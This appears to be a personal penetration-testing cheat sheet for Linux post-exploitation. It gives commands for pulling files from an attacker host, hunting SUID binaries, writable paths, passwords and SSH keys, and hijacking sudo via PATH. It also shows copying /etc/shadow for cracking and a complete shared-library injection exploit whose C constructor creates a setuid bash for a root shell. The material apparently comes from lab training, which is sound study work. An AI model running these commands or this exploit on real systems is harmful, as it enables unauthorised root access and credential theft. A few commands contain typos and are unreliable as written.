## Screen
```
screen -ls
screen -S name

CTRL A+D to detach
```
## File Transfers
```bash
# wget
wget http://<ip>/file_name -O /path/to/save/file

# Netcat
nc -nv <ip> <port> > file/to/recv

# cURL
curl http://<ip>/file_name --output file_name

# Sync clock
sudo ntpdate -u DC
```

## Information Gathering
```bash
# Find useable Linux files
find / -perm -u=s -type f 2>/dev/null

# Find files that can setuid `cap_setuid` allows a process change its UID to **any user
find / -type f -exec getcap {} \;

# Find SUID
find / -user root -perm -4000 -type f 2>/dev/null
find / -perm -4000 -o -perm -2000 2>/dev/null

# Find writeable files
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

# Find writeable directories
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null

# Find "password"
grep --color=auto -rnw '/' -ie "PASSWORD" --colow=always 2> /dev/null

# Find id_rsa or authorized_keys
find / -name id_rsa 2> /dev/null

# Disk Usage
sudo du -hsx ./* | sort -rh | head -n 40

# Cron Jobs
ls -la /etc/cron.daily/

crontab -l

crontab -u root -l

systemctl list-timers

# Hunt passwords
grep password -B 5 -A 5 # below 5 above 5

# Stroll through the neighbourhood
arp -a

ip neigh

# Knock knock neo...
netstat -tupln
```

## Abusing Sudo
Can sudo but absolute path is specified? Use `ltrace` to view libraries being loaded by these programs and check if absolute path is specified or not

```bash
# Easy win?
sudo -l # Check programs on GTFOBins

# Can sudo, abosulte path not specified?
echo "/bin/sh" > <program_name>
chmod 777 <program_name>
# Export PATH=.:$PATH
sudo <program_name>
```

Priv esc notes:
```bash
cat ~/.bash_history | grep -i passw

cat /etc/passwd | cut -d: -f1
awk -F: '($3 == "0") {print}' /etc/passwd

cp /etc/passwd .\passwd
cp /etc/shadow .\passwd
unshadow passwd shadow > unshadowed.txt


find / -name authorized_keys 2> /dev/null

find / -name id_rsa 2> /dev/null

find / -type f -perm -04000 -ls 2>/dev/null

strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"

access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY)      = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libdl.so.2", O_RDONLY)       = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libm.so.6", O_RDONLY)        = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libc.so.6", O_RDONLY)        = 3
open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)

4. From the output, notice that a .so file is missing from a writable directory.

5. In command prompt type: mkdir /home/user/.config
6. In command prompt type: cd /home/user/.config
7. Open a text editor and type:

#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}

8. Save the file as libcalc.c
9. In command prompt type:
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
10. In command prompt type: /usr/local/bin/suid-so
11. In command prompt type: id
```